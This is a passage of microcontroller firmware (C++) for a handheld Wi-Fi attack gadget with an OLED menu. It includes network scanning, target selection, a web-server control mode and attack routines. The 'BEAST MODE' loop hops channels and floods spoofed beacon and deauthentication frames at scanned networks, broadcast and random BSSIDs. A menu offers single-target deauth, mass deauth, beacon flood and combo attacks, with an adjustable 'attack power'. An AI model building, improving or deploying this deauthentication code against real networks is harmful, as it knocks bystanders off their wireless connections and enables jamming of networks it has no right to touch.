      channelSwitchTime = currentTime;
    }

    // Attack all networks in scan results with both beacon and deauth frames
    // Scale attack packets based on attack intensity
    int packetsToSend = (perdeauth * 2 * attackIntensity) / 100;
    packetsToSend = max(1, packetsToSend); // Ensure at least one packet

    // Focus on networks on the current channel
    bool foundNetworksOnChannel = false;

    // First priority: Attack networks on current channel
    for (size_t i = 0; i < min((size_t)5, scan_results.size()); i++) {
      if (scan_results[i].channel == static_cast<uint>(currentChannel)) {
        foundNetworksOnChannel = true;
        String ssid = scan_results[i].ssid;
        const char *ssid_cstr = ssid.c_str();

        // Copy target network BSSID
        uint8_t target_bssid[6];
        memcpy(target_bssid, scan_results[i].bssid, 6);

        // Skip if it's our own AP
        if (isOurAP(target_bssid)) {
          display.setTextColor(WHITE);
          display.setCursor(5, 25);
          display.print("Skipped own AP: ");
          display.println(ssid.length() > 8 ? ssid.substring(0, 6) + ".." : ssid);
          display.display();
          continue;
        }

        // Send beacon frames (scaled by intensity)
        for (int x = 0; x < packetsToSend / 2; x++) {
          wifi_tx_beacon_frame(target_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", ssid_cstr);
          packetCount++;
        }

        // Send deauth frames with all reason codes to all common MAC addresses (scaled by intensity)
        for (size_t m = 0; m < sizeof(common_macs)/sizeof(common_macs[0]); m++) {
          // Use different reason codes for different targets for maximum effectiveness
          for (size_t r = 0; r < min((size_t)packetsToSend, sizeof(reason_codes)/sizeof(reason_codes[0])); r++) {
            wifi_tx_deauth_frame(target_bssid, (void *)common_macs[m], reason_codes[r]);
            packetCount++;
          }
        }
      }
    }

    // If no networks found on current channel, try attack against random networks
    if (!foundNetworksOnChannel && !targetPriority.empty()) {
      // Attack top 3 networks by signal strength regardless of channel
      for (size_t i = 0; i < min((size_t)3, targetPriority.size()); i++) {
        size_t idx = targetPriority[i];
        String ssid = scan_results[idx].ssid;
        const char *ssid_cstr = ssid.c_str();

        // Copy target network BSSID
        uint8_t target_bssid[6];
        memcpy(target_bssid, scan_results[idx].bssid, 6);

        // Send beacon frames (fewer since we're off-channel)
        for (int x = 0; x < packetsToSend / 4; x++) {
          wifi_tx_beacon_frame(target_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", ssid_cstr);
          packetCount++;
        }

        // Send deauth frames (fewer since we're off-channel)
        for (size_t m = 0; m < sizeof(common_macs)/sizeof(common_macs[0]); m += 2) {
          wifi_tx_deauth_frame(target_bssid, (void *)common_macs[m], reason_codes[m % 16]);
          packetCount++;
        }
      }
    }

    // Send additional random deauth packets to all channels (for hidden networks)
    uint8_t random_bssid[6];
    for (int i = 0; i < 6; i++) {
      random_bssid[i] = random(0, 255);
    }
    for (int r = 0; r < packetsToSend / 5; r++) {
      wifi_tx_deauth_frame(random_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", reason_codes[r % 16]);
      packetCount++;
    }

    // Enhanced display with real-time statistics
    if (currentTime - lastUpdateTime > 200) {
      display.clearDisplay();

      // Dramatic warning title with hazard stripes
      display.fillRect(0, 0, SCREEN_WIDTH, 10, WHITE);
      int stripeWidth = 10;
      for (int s = 0; s < SCREEN_WIDTH; s += stripeWidth*2) {
        display.fillRect(s, 0, stripeWidth, 10, BLACK);
      }

      display.setTextColor(BLACK);
      display.setTextSize(1);
      display.setCursor(9, 1);
      display.print("BEAST MODE ACTIVE");

      // Draw attack status box with frame
      display.drawRect(0, 0, SCREEN_WIDTH, SCREEN_HEIGHT, WHITE);
      display.drawRect(2, 12, SCREEN_WIDTH-4, SCREEN_HEIGHT-14, WHITE);

      // Channel status with band indicator
      display.setTextColor(WHITE);
      display.setCursor(5, 15);
      display.print("CH: ");
      display.print(currentChannel);
      display.print(currentChannel >= 36 ? " (5G)" : " (2.4G)");

      // Show if networks exist on current channel
      if (channelsWithNetworks[currentChannel]) {
        display.print(" *");
      }

      // Attack stats with enhanced metrics
      display.setCursor(5, 25);
      display.print("PKT: ");
      if (packetCount < 1000) {
        display.print(packetCount);
      } else if (packetCount < 1000000) {
        display.print(packetCount / 1000);
        display.print("K");
      } else {
        display.print(packetCount / 1000000);
        display.print("M");
      }

      // Packets per second calculation
      static unsigned long lastPacketCount = 0;
      static unsigned long lastPacketTime = 0;
      if (currentTime - lastPacketTime >= 1000) {
        float pps = (packetCount - lastPacketCount) * 1000.0 / (currentTime - lastPacketTime);
        display.print(" | ");
        display.print((int)pps);
        display.print("/s");
        lastPacketCount = packetCount;
        lastPacketTime = currentTime;
      }

      // Network and channel hop status
      display.setCursor(5, 35);
      display.print("NETS: ");
      display.print(scan_results.size());
      display.print(" | HOPS: ");
      display.print(channelSwitchCount);

      // Runtime with thermal management indicator
      display.setCursor(5, 45);
      unsigned long runTime = (currentTime - startTime) / 1000;
      unsigned long hours = runTime / 3600;
      unsigned long mins = (runTime % 3600) / 60;
      unsigned long secs = runTime % 60;

      display.print("TIME: ");
      if (hours > 0) {
        display.print(hours);
        display.print("h ");
        display.print(mins);
        display.print("m");
      } else if (mins > 0) {
        display.print(mins);
        display.print("m ");
        display.print(secs);
        display.print("s");
      } else {
        display.print(secs);
        display.print("s");
      }

      // Power level display with thermal indicator
      display.setCursor(5, 55);
      display.print("PWR: ");
      display.print(attackIntensity);
      display.print("%");

      if (thermalThrottling) {
        display.print(" (THERM)");
      }

      // Power indicator bar
      int barWidth = (SCREEN_WIDTH - 60) * attackIntensity / 100;
      display.drawRect(60, 55, SCREEN_WIDTH-65, 8, WHITE);

      // Pulsing effect for power bar
      int barFlash = (currentTime / 200) % 2; // Flashing effect
      if (thermalThrottling && barFlash) {
        // Warning pattern for thermal throttling
        for (int i = 0; i < barWidth; i += 4) {
          display.fillRect(60 + i, 55, 2, 8, WHITE);
        }
      } else {
        // Normal power bar
        display.fillRect(60, 55, barWidth, 8, WHITE);
      }

      display.display();
      lastUpdateTime = currentTime;
    }

    // Prevent CPU from getting too hot with small delay
    // Adjust based on attack intensity
    delayMicroseconds(100 * (100 - attackIntensity));
  }
}

void attackLoop() {
  int attackState = 0;
  bool running = true;
  unsigned long animTimer = 0;
  int animFrame = 0;

  // Wait for button release before starting loop
  while (digitalRead(BTN_OK) == LOW) {
    delay(10);
  }

  while (running) {
    display.clearDisplay();

    // Draw hazard stripes in corners
    for (int i = 0; i < 10; i+=3) {
      display.drawLine(0, i, 10-i, 0, WHITE);
      display.drawLine(SCREEN_WIDTH-10+i, 0, SCREEN_WIDTH-1, i, WHITE);
      display.drawLine(0, SCREEN_HEIGHT-1-i, 10-i, SCREEN_HEIGHT-1, WHITE);
      display.drawLine(SCREEN_WIDTH-10+i, SCREEN_HEIGHT-1, SCREEN_WIDTH-1, SCREEN_HEIGHT-1-i, WHITE);
    }

    // Animated warning title bar with blinking effect
    if (millis() - animTimer > 500) {
      animTimer = millis();
      animFrame = !animFrame;
    }

    display.fillRect(0, 0, SCREEN_WIDTH, 12, animFrame ? WHITE : BLACK);
    display.fillRect(0, 1, SCREEN_WIDTH, 10, animFrame ? BLACK : WHITE);
    display.setTextColor(animFrame ? WHITE : BLACK);
    display.setTextSize(1);
    display.setCursor(10, 2);
    display.print(">> ATTACK SELECTION <<");

    // Draw attack options with enhanced visuals
    const char *attackTypes[] = { 
      "SINGLE TARGET", 
      "TARGET ALL", 
      "BEACON FLOOD", 
      "COMBO ATTACK",
      "BEAST MODE",
      "[RETURN]" 
    };

    // Draw selection box
    display.drawRect(5, 15, SCREEN_WIDTH-10, 47, WHITE);

    for (int i = 0; i < 6; i++) {
      if (i == attackState) {
        // Draw selected option with highlight
        display.fillRect(7, 17 + (i * 8), SCREEN_WIDTH-14, 8, WHITE);

        // Animated indicator
        if (animFrame) {
          display.fillTriangle(10, 21 + (i * 8), 15, 17 + (i * 8), 15, 25 + (i * 8), BLACK);
        }
      }

      // Use scrolling text for attack type names
      int maxWidth = SCREEN_WIDTH - 40; // Leave space for icons
      int xPos = i == attackState ? 18 : 15;
      scrollText(String(attackTypes[i]), xPos, 18 + (i * 8), maxWidth, i == attackState);

      // Draw attack-specific icons
      if (i == attackState && i < 5) {
        int iconX = SCREEN_WIDTH - 20;
        int iconY = 17 + (i * 8) + 4;

        if (i == 0) { // Single target
          display.drawCircle(iconX, iconY, 4, i == attackState ? BLACK : WHITE);
          display.drawLine(iconX-2, iconY-2, iconX+2, iconY+2, i == attackState ? BLACK : WHITE);
          display.drawLine(iconX+2, iconY-2, iconX-2, iconY+2, i == attackState ? BLACK : WHITE);
        } else if (i == 1) { // Mass deauth - multiple targets
          for (int d = 0; d < 3; d++) {
            display.drawCircle(iconX-2+d*2, iconY-2+d, 2, i == attackState ? BLACK : WHITE);
            display.drawLine(iconX-3+d*2, iconY-3+d, iconX-1+d*2, iconY-1+d, i == attackState ? BLACK : WHITE);
          }
        } else if (i == 2) { // Beacon - broadcast tower
          display.drawTriangle(iconX, iconY-4, iconX-3, iconY+2, iconX+3, iconY+2, i == attackState ? BLACK : WHITE);
          display.drawLine(iconX, iconY-6, iconX, iconY-2, i == attackState ? BLACK : WHITE);
        } else if (i == 3) { // Combo - explosion
          for (int r = 0; r < 4; r++) {
            display.drawLine(iconX, iconY, iconX + cos(r*PI/2)*4, iconY + sin(r*PI/2)*4, i == attackState ? BLACK : WHITE);
            display.drawLine(iconX, iconY, iconX + cos(r*PI/2+PI/4)*3, iconY + sin(r*PI/2+PI/4)*3, i == attackState ? BLACK : WHITE);
          }
        } else if (i == 4) { // Beast mode - skull icon
          display.drawRect(iconX-3, iconY-3, 7, 7, i == attackState ? BLACK : WHITE); // Skull
          display.drawPixel(iconX-1, iconY-1, i == attackState ? BLACK : WHITE); // Left eye
          display.drawPixel(iconX+1, iconY-1, i == attackState ? BLACK : WHITE); // Right eye
          display.drawLine(iconX-2, iconY+1, iconX+2, iconY+1, i == attackState ? BLACK : WHITE); // Mouth
        }
      }
    }

    display.display();

    // Handle button inputs
    if (digitalRead(BTN_OK) == LOW) {
      // Flash screen for visual feedback
      display.invertDisplay(true);
      delay(50);
      display.invertDisplay(false);
      delay(100);

      if (attackState == 5) {  // Back option
        running = false;
      } else {
        // Execute selected attack
        drawAttackScreen(attackState);
        switch (attackState) {
          case 0:
            Single();
            break;
          case 1:
            All();
            break;
          case 2:
            Becaon();
            break;
          case 3:
            BecaonDeauth();
            break;
          case 4:
            BeastMode();
            break;
        }
      }
    }

    if (digitalRead(BTN_UP) == LOW) {
      delay(150);
      if (attackState < 5) {
        attackState++;
        // Visual feedback
        display.invertDisplay(true);
        delay(30);
        display.invertDisplay(false);
      }
    }

    if (digitalRead(BTN_DOWN) == LOW) {
      delay(150);
      if (attackState > 0) {
        attackState--;
        // Visual feedback
        display.invertDisplay(true);
        delay(30);
        display.invertDisplay(false);
      }
    }

    delay(10); // Small delay to prevent display flickering
  }
}

// New function to handle network selection
void networkSelectionLoop() {
  bool running = true;
  // For blinking cursor effect
  bool cursorBlink = false;
  unsigned long lastBlink = 0;
  // For animation effects
  int animationFrame = 0;
  unsigned long lastAnimUpdate = 0;

  // Wait for button release before starting loop
  while (digitalRead(BTN_OK) == LOW) {
    delay(10);
  }

  while (running) {
    display.clearDisplay();

    // Create frame with targeting display look
    display.drawRect(0, 0, SCREEN_WIDTH, SCREEN_HEIGHT, WHITE);
    display.drawRect(2, 2, SCREEN_WIDTH-4, SCREEN_HEIGHT-4, WHITE);

    // Tactical targeting crosshairs in corners
    display.drawLine(0, 0, 8, 8, WHITE);
    display.drawLine(SCREEN_WIDTH-1, 0, SCREEN_WIDTH-9, 8, WHITE);
    display.drawLine(0, SCREEN_HEIGHT-1, 8, SCREEN_HEIGHT-9, WHITE);
    display.drawLine(SCREEN_WIDTH-1, SCREEN_HEIGHT-1, SCREEN_WIDTH-9, SCREEN_HEIGHT-9, WHITE);

    // Oscilloscope style header
    display.fillRect(0, 0, SCREEN_WIDTH, 10, WHITE);
    display.setTextColor(BLACK);
    display.setCursor(5, 1);
    display.print("SELECT TARGET");

    // Draw counter with total networks
    display.setCursor(SCREEN_WIDTH-28, 1);
    display.print(scrollindex+1);
    display.print("/");
    display.print(scan_results.size());

    // Network details panel
    display.setTextColor(WHITE);

    // Network name with cyberpunk-style frame
    display.drawRect(5, 13, SCREEN_WIDTH-10, 12, WHITE);

    // Show cursor blink effect every 250ms
    unsigned long currentTime = millis();
    if (currentTime - lastBlink > 250) {
      cursorBlink = !cursorBlink;
      lastBlink = currentTime;
    }

    if (cursorBlink) {
      display.fillRect(8, 15, 3, 8, WHITE);
    }

    // Use scrolling text for SSID display
    int maxWidth = SCREEN_WIDTH - 25;
    scrollText(SelectedSSID, 13, 15, maxWidth, false);

    // Signal strength display
    display.drawRect(5, 27, SCREEN_WIDTH-10, 10, WHITE);

    // RSSI bar (scale from -100 to -30 dBm)
    int rssiPercent = constrain(map(scan_results[scrollindex].rssi, -100, -30, 0, 100), 0, 100);
    display.fillRect(7, 29, (SCREEN_WIDTH-14) * rssiPercent / 100, 6, WHITE);

    // Show RSSI value
    char rssiText[10];
    sprintf(rssiText, "%ddBm", scan_results[scrollindex].rssi);
    display.setCursor(SCREEN_WIDTH/2 - strlen(rssiText)*3, 29);
    display.setTextColor(rssiPercent > 50 ? BLACK : WHITE);
    display.print(rssiText);

    // Technical details box
    display.drawRect(5, 39, SCREEN_WIDTH-10, 24, WHITE);

    // Animate signal waveform based on channel
    if (currentTime - lastAnimUpdate > 100) {
      animationFrame = (animationFrame + 1) % 8;
      lastAnimUpdate = currentTime;
    }

    // Draw channel number and band
    display.setTextColor(WHITE);
    display.setCursor(8, 42);
    display.print("CH:");
    display.print(scan_results[scrollindex].channel);

    // Show band with appropriate icon
    display.setCursor(45, 42);
    display.print("BAND:");
    display.print(SSIDCh);

    // Show BSSID in short form with scrolling for longer MAC addresses
    display.setCursor(8, 51);
    display.print("ID:");
    char bssidShort[20];
    sprintf(bssidShort, "%02X:%02X:%02X:%02X:%02X:%02X", 
            scan_results[scrollindex].bssid[0], 
            scan_results[scrollindex].bssid[1],
            scan_results[scrollindex].bssid[2],
            scan_results[scrollindex].bssid[3],
            scan_results[scrollindex].bssid[4],
            scan_results[scrollindex].bssid[5]);

    // Use scrolling for BSSID if it's too long
    int maxBssidWidth = SCREEN_WIDTH - 35;
    scrollText(String(bssidShort), 25, 51, maxBssidWidth, false);

    // Draw signal waveform animation
    int baseY = 46;
    int waveHeight = 3;
    if (SSIDCh == "5G") {
      // 5GHz has shorter, more frequent waves
      for (int x = 88; x < SCREEN_WIDTH-8; x += 4) {
        int y = baseY + sin((x + animationFrame) * 0.8) * waveHeight;
        display.drawPixel(x, y, WHITE);
        display.drawPixel(x+1, y, WHITE);
      }
    } else {
      // 2.4GHz has longer waves
      for (int x = 88; x < SCREEN_WIDTH-8; x += 2) {
        int y = baseY + sin((x + animationFrame) * 0.3) * waveHeight;
        display.drawPixel(x, y, WHITE);
      }
    }

    // Navigation indicators
    if (scrollindex > 0) {
      display.fillTriangle(SCREEN_WIDTH/2-5, SCREEN_HEIGHT-3, SCREEN_WIDTH/2+5, SCREEN_HEIGHT-3, SCREEN_WIDTH/2, SCREEN_HEIGHT-8, WHITE);
    }
    if (static_cast<size_t>(scrollindex) < scan_results.size() - 1) {
      display.fillTriangle(SCREEN_WIDTH/2-5, 10+3, SCREEN_WIDTH/2+5, 10+3, SCREEN_WIDTH/2, 10+8, WHITE);
    }

    display.display();

    // Modified button handling
    if (digitalRead(BTN_OK) == LOW) {
      // Flash screen for visual feedback
      display.invertDisplay(true);
      delay(50);
      display.invertDisplay(false);
      delay(100);

      // Wait for button release before exiting
      while (digitalRead(BTN_OK) == LOW) {
        delay(10);
      }
      running = false;
    }

    if (digitalRead(BTN_UP) == LOW) {
      delay(150);
      if (static_cast<size_t>(scrollindex) < scan_results.size() - 1) {
        scrollindex++;
        SelectedSSID = scan_results[scrollindex].ssid;
        SSIDCh = scan_results[scrollindex].channel >= 36 ? "5G" : "2.4G";

        // Visual feedback
        display.invertDisplay(true);
        delay(30);
        display.invertDisplay(false);
      }
    }

    if (digitalRead(BTN_DOWN) == LOW) {
      delay(150);
      if (scrollindex > 0) {
        scrollindex--;
        SelectedSSID = scan_results[scrollindex].ssid;
        SSIDCh = scan_results[scrollindex].channel >= 36 ? "5G" : "2.4G";

        // Visual feedback
        display.invertDisplay(true);
        delay(30);
        display.invertDisplay(false);
      }
    }

    delay(10);  // Small delay to prevent display flickering
  }
}

void setup() {
  // Initialize hardware pins with better debounce
  pinMode(BTN_DOWN, INPUT_PULLUP);
  pinMode(BTN_UP, INPUT_PULLUP);
  pinMode(BTN_OK, INPUT_PULLUP);

  // Initialize serial with increased buffer
  Serial.begin(115200);

  // Initialize display with error recovery
  int displayRetries = 0;
  while (!display.begin(SSD1306_SWITCHCAPVCC, 0x3C)) {
    Serial.println(F("SSD1306 init failed, retrying..."));
    delay(500);
    displayRetries++;
    if (displayRetries >= 3) {
      // If display fails, still continue but show message on serial
      Serial.println(F("Display initialization failed permanently"));
      break;
    }
  }

  // Show loading animation
  titleScreen();

  // Initialize debugging
  DEBUG_SER_INIT();

  // Setup WiFi with error recovery
  int wifiRetries = 0;
  bool wifiSuccess = false;

  while (!wifiSuccess && wifiRetries < 3) {
    display.clearDisplay();
    display.setTextColor(WHITE);
    display.setTextSize(1);
    display.setCursor(10, 10);
    display.print("Initializing WiFi");
    display.setCursor(10, 25);
    display.print("Attempt ");
    display.print(wifiRetries + 1);
    display.print("/3");
    display.display();

    // Try to start WiFi in AP mode
    WiFi.apbegin(ssid, pass, (char *)String(current_channel).c_str());
    delay(1000);

    // Perform network scan
    int scanResult = scanNetworks();
    if (scanResult == 0) {
      wifiSuccess = true;
    } else {
      wifiRetries++;
      delay(1000);
    }
  }

  // Handle complete failure
  if (!wifiSuccess) {
    display.clearDisplay();
    display.setTextColor(WHITE);
    display.setTextSize(1);
    display.setCursor(5, 20);
    display.print("WiFi initialization");
    display.setCursor(5, 30);
    display.print("failed. Press OK to");
    display.setCursor(5, 40);
    display.print("retry setup...");
    display.display();

    // Wait for button press to retry
    while (digitalRead(BTN_OK) == HIGH) {
      delay(100);
    }
    // Soft reset by restarting setup
    setup();
    return;
  }

  // Debug output of scan results
#ifdef DEBUG
  for (uint i = 0; i < scan_results.size(); i++) {
    DEBUG_SER_PRINT(scan_results[i].ssid + " ");
    for (int j = 0; j < 6; j++) {
      if (j > 0) DEBUG_SER_PRINT(":");
      DEBUG_SER_PRINT(scan_results[i].bssid[j], HEX);
    }
    DEBUG_SER_PRINT(" " + String(scan_results[i].channel) + " ");
    DEBUG_SER_PRINT(String(scan_results[i].rssi) + "\n");
  }
#endif

  // Sort networks by signal strength for better UX
  for (size_t i = 0; i < scan_results.size(); i++) {
    for (size_t j = i + 1; j < scan_results.size(); j++) {
      if (scan_results[i].rssi < scan_results[j].rssi) {
        // Swap networks
        WiFiScanResult temp = scan_results[i];
        scan_results[i] = scan_results[j];
        scan_results[j] = temp;
      }
    }
  }

  // Initialize with the strongest network selected
  if (!scan_results.empty()) {
    SelectedSSID = scan_results[0].ssid;
    SSIDCh = scan_results[0].channel >= 36 ? "5G" : "2.4G";
  } else {
    // Fallback values if no networks found
    SelectedSSID = "NO NETWORKS";
    SSIDCh = "N/A";
  }

  // Record startup time for auto-scan feature
  lastAutoScan = millis();

  // Initial settings display
  display.clearDisplay();
  display.setTextColor(WHITE);
  display.setTextSize(1);
  display.setCursor(10, 20);
  display.print("Setup complete!");
  display.setCursor(10, 35);
  display.print("Found ");
  display.print(scan_results.size());
  display.print(" networks");
  display.display();
  delay(1000);
}

// Physical stop button handler
void checkStopAttack() {
  // Check if both UP and OK buttons are pressed together for stopping attacks
  if (digitalRead(BTN_UP) == LOW && digitalRead(BTN_OK) == LOW) {
    // Visual feedback
    display.clearDisplay();
    display.setTextColor(WHITE);
    display.setTextSize(2);
    display.setCursor(20, 15);
    display.println("STOP!");
    display.setTextSize(1);
    display.setCursor(10, 40);
    display.println("All attacks stopped");
    display.display();

    // Request stop for any running attack
    requestStopAttack();
    stopWebServer(); // Stop web server if running

    // Wait for button release
    while (digitalRead(BTN_UP) == LOW || digitalRead(BTN_OK) == LOW) {
      delay(50);
    }

    // Confirmation
    display.clearDisplay();
    display.setTextSize(1);
    display.setCursor(15, 25);
    display.println("System returned to");
    display.setCursor(15, 35);
    display.println("normal operation");
    display.display();
    delay(1000);
  }
}

void loop() {
  unsigned long currentTime = millis();

  // Check for emergency stop (UP + OK buttons together)
  checkStopAttack();

  // Auto-scan networks periodically to stay updated
  if (currentTime - lastAutoScan > static_cast<unsigned long>(autoScanInterval * 1000)) {
    // Only rescan when not in an active menu to avoid interrupting the user
    if (digitalRead(BTN_OK) == HIGH && digitalRead(BTN_UP) == HIGH && digitalRead(BTN_DOWN) == HIGH) {
      // Quick background scan without animation
      if (scan_results.size() > 0) {
        // Remember selected network if possible
        String lastSelected = SelectedSSID;
        for (size_t i = 0; i < scan_results.size(); i++) {
          if (scan_results[i].ssid == lastSelected) {
            // Network found (no need to store channel)
            break;
          }
        }

        // Show mini notification
        display.fillRect(0, 0, SCREEN_WIDTH, 10, WHITE);
        display.setTextColor(BLACK);
        display.setCursor(20, 1);
        display.print("AUTO-SCANNING");
        display.display();

        // Perform scan
        scanNetworks();

        // Try to reselect the same network
        bool foundOldNetwork = false;
        for (size_t i = 0; i < scan_results.size(); i++) {
          if (scan_results[i].ssid == lastSelected) {
            scrollindex = i;
            SelectedSSID = lastSelected;
            SSIDCh = scan_results[i].channel >= 36 ? "5G" : "2.4G";
            foundOldNetwork = true;
            break;
          }
        }

        // If we couldn't find the network, select the strongest one
        if (!foundOldNetwork && !scan_results.empty()) {
          scrollindex = 0;
          SelectedSSID = scan_results[0].ssid;
          SSIDCh = scan_results[0].channel >= 36 ? "5G" : "2.4G";
        }
      } else {
        // If no networks found earlier, do a full scan
        scanNetworks();
        if (!scan_results.empty()) {
          scrollindex = 0;
          SelectedSSID = scan_results[0].ssid;
          SSIDCh = scan_results[0].channel >= 36 ? "5G" : "2.4G";
        }
      }

      lastAutoScan = currentTime;
    }
  }

  // Draw the enhanced main menu interface with status indicators
  drawMainMenu(menustate);

  // Check for button combinations for advanced features
  // Hold UP+DOWN for 2 seconds to toggle advanced mode
  static unsigned long advancedModeStartTime = 0;
  if (digitalRead(BTN_UP) == LOW && digitalRead(BTN_DOWN) == LOW) {
    if (advancedModeStartTime == 0) {
      advancedModeStartTime = currentTime;
    } else if (currentTime - advancedModeStartTime > 2000) {
      // Toggle advanced mode
      advancedMode = !advancedMode;
      // Visual feedback
      display.invertDisplay(true);
      delay(200);
      display.invertDisplay(false);
      delay(100);
      display.invertDisplay(true);
      delay(100);
      display.invertDisplay(false);
      // Reset timing
      advancedModeStartTime = 0;
      // Show confirmation
      display.clearDisplay();
      display.setTextColor(WHITE);
      display.setTextSize(1);
      display.setCursor(15, 20);
      display.print(advancedMode ? "ADVANCED MODE ON" : "ADVANCED MODE OFF");
      display.setCursor(10, 35);
      display.print(advancedMode ? "Extra features enabled" : "Standard features only");
      display.display();
      delay(1500);
    }
  } else {
    advancedModeStartTime = 0;
  }

  // Handle OK button press with improved debounce
  if (digitalRead(BTN_OK) == LOW) {
    if (currentTime - lastOkTime > DEBOUNCE_DELAY) {
      if (okstate) {
        // Visual feedback on button press
        display.invertDisplay(true);
        delay(50);
        display.invertDisplay(false);

        // Declare variables outside switch to avoid jump errors
        int scanResult;

        switch (menustate) {
          case 0:  // Attack
            // Show attack options and handle attack execution
            display.clearDisplay();
            attackLoop();
            // Reset attack timing variables
            attackStartTime = 0;
            totalPacketsSent = 0;
            break;

          case 1:  // Scan
            // Execute scan with animation
            display.clearDisplay();
            drawScanScreen();
            scanResult = scanNetworks();
            if (scanResult == 0) {
              drawStatusBar("SCAN COMPLETE");
              display.display();

              // Update selected network to strongest one
              if (!scan_results.empty()) {
                scrollindex = 0;
                SelectedSSID = scan_results[0].ssid;
                SSIDCh = scan_results[0].channel >= 36 ? "5G" : "2.4G";
              }

              delay(1000);
            } else if (scanResult == 1) {
              // Scan failed
              drawStatusBar("SCAN FAILED");
              display.setTextColor(WHITE);
              display.setCursor(10, 30);
              display.print("No networks found");
              display.setCursor(10, 40);
              display.print("Try again later");
              display.display();
              delay(2000);
            }
            lastAutoScan = currentTime; // Reset auto-scan timer
            break;

          case 2:  // Select Network
            // Show network selection interface
            networkSelectionLoop();
            break;

          case 3:  // Web Server
            // Launch web server for remote control
            display.clearDisplay();
            display.setTextColor(WHITE);
            display.setTextSize(1);
            display.setCursor(15, 20);
            display.println("Starting Web Server");
            display.setCursor(15, 35);
            display.println("Please wait...");
            display.display();
            delay(500);
            WebServerMode();
            // When returning from web server, wait for button release
            while (digitalRead(BTN_OK) == LOW) {
              delay(50);
            }
            break;

          case 4:  // Info
            // Display information screen with advanced features
            if (advancedMode) {
              // Show enhanced information screen with more options
              displayAdvancedInformationScreen();
            } else {
              // Regular info screen
              displayInformationScreen();
            }
            break;
        }
      }
      lastOkTime = currentTime;
    }
  }

  // Handle Down button with improved behavior
  if (digitalRead(BTN_DOWN) == LOW) {
    if (currentTime - lastDownTime > DEBOUNCE_DELAY) {
      if (menustate > 0) {
        menustate--;
        // Visual feedback
        display.invertDisplay(true);
        delay(30);
        display.invertDisplay(false);
      } else if (menustate == 0 && advancedMode) {
        // In advanced mode, wrap around to bottom
        menustate = 4;
        display.invertDisplay(true);
        delay(30);
        display.invertDisplay(false);
      }
      lastDownTime = currentTime;
    }
  }

  // Handle Up button with improved behavior
  if (digitalRead(BTN_UP) == LOW) {
    if (currentTime - lastUpTime > DEBOUNCE_DELAY) {
      if (menustate < 4) {
        menustate++;
        // Visual feedback
        display.invertDisplay(true);
        delay(30);
        display.invertDisplay(false);
      } else if (menustate == 4 && advancedMode) {
        // In advanced mode, wrap around to top
        menustate = 0;
        display.invertDisplay(true);
        delay(30);
        display.invertDisplay(false);
      }
      lastUpTime = currentTime;
    }
  }

  // Add small delay to prevent excessive CPU usage
  delay(10);
}

// New function for advanced information and settings
void displayAdvancedInformationScreen() {
  // Wait for button release first to prevent immediate exit
  while (digitalRead(BTN_OK) == LOW) {
    delay(50);
  }
  delay(200); // Debounce

  bool inAdvancedMenu = true;
  int advMenuSelection = 0;
  const int NUM_ADV_OPTIONS = 5;

  while (inAdvancedMenu) {
    display.clearDisplay();

    // Draw tech-style frame
    display.drawRect(0, 0, SCREEN_WIDTH, SCREEN_HEIGHT, WHITE);
    display.drawRect(2, 2, SCREEN_WIDTH-4, SCREEN_HEIGHT-4, WHITE);

    // Title bar
    display.fillRect(0, 0, SCREEN_WIDTH, 10, WHITE);
    display.setTextColor(BLACK);
    display.setTextSize(1);
    display.setCursor(20, 1);
    display.print("ADVANCED SETTINGS");

    // Draw menu options
    const char* menuItems[] = {
      "Attack Power",
      "Auto-Scan Interval",
      "Signal Boost Mode",
      "About",
      "Exit"
    };

    for (int i = 0; i < NUM_ADV_OPTIONS; i++) {
      if (i == advMenuSelection) {
        // Selected item
        display.fillRect(5, 15 + i*10, SCREEN_WIDTH-10, 10, WHITE);
      } else {
        display.drawRect(5, 15 + i*10, SCREEN_WIDTH-10, 10, WHITE);
      }

      // Use scrolling for menu items
      int maxWidth = SCREEN_WIDTH - 40; // Leave space for values
      scrollText(String(menuItems[i]), 8, 16 + i*10, maxWidth, i == advMenuSelection);

      // Show current values with appropriate colors
      display.setTextColor(i == advMenuSelection ? BLACK : WHITE);

      if (i == 0) {
        // Attack power
        display.setCursor(SCREEN_WIDTH - 30, 16 + i*10);
        char buffer[5];
        sprintf(buffer, "%d/10", perdeauth);
        display.print(buffer);
      } else if (i == 1) {
        // Auto-scan interval
        display.setCursor(SCREEN_WIDTH - 35, 16 + i*10);
        display.print(autoScanInterval);
        display.print("s");
      } else if (i == 2) {
        // Signal boost mode
        display.setCursor(SCREEN_WIDTH - 30, 16 + i*10);
        display.print(signalBoostMode ? "ON" : "OFF");
      }
    }

    display.display();

    // Handle button presses
    if (digitalRead(BTN_OK) == LOW) {
      delay(200); // Debounce

      if (advMenuSelection == 0) {
        // Change attack power
        perdeauth = (perdeauth % 10) + 1; // Cycle 1-10
      } 
      else if (advMenuSelection == 1) {
        // Change auto-scan interval
        if (autoScanInterval == 30) autoScanInterval = 60;
        else if (autoScanInterval == 60) autoScanInterval = 120;
        else if (autoScanInterval == 120) autoScanInterval = 300;
        else autoScanInterval = 30;
      }
      else if (advMenuSelection == 2) {
        // Toggle signal boost mode
        signalBoostMode = !signalBoostMode;
      }
      else if (advMenuSelection == 3) {
        // Show about screen
        displayInformationScreen();
      }
      else if (advMenuSelection == 4) {
        // Exit advanced menu
        inAdvancedMenu = false;
      }

      // Wait for button release
      while (digitalRead(BTN_OK) == LOW) {
        delay(50);
      }
    }

    if (digitalRead(BTN_UP) == LOW) {
      delay(150); // Debounce
      advMenuSelection = (advMenuSelection + 1) % NUM_ADV_OPTIONS;
    }

    if (digitalRead(BTN_DOWN) == LOW) {
      delay(150); // Debounce
      advMenuSelection = (advMenuSelection + NUM_ADV_OPTIONS - 1) % NUM_ADV_OPTIONS;
    }

    delay(50);
  }
}

// Function to display the information screen
void displayInformationScreen() {
  // Wait for button release first to prevent immediate exit
  while (digitalRead(BTN_OK) == LOW) {
    delay(50);
  }
  delay(200); // Debounce

  // Static text items for info screen
  const String infoItems[] = {
    "Name: PHATZ",
    "Tiktok: @phatxzhh",
    "GitHub: PogiPhatzxxx"
  };
  const int NUM_INFO_ITEMS = 3; // Only 3 items now

  // For animating the scrolling
  unsigned long lastUpdateTime = 0;
  int activeItem = 0;

  // Draw fancy information screen
  display.clearDisplay();

  // Draw tech-style frame
  display.drawRect(0, 0, SCREEN_WIDTH, SCREEN_HEIGHT, WHITE);
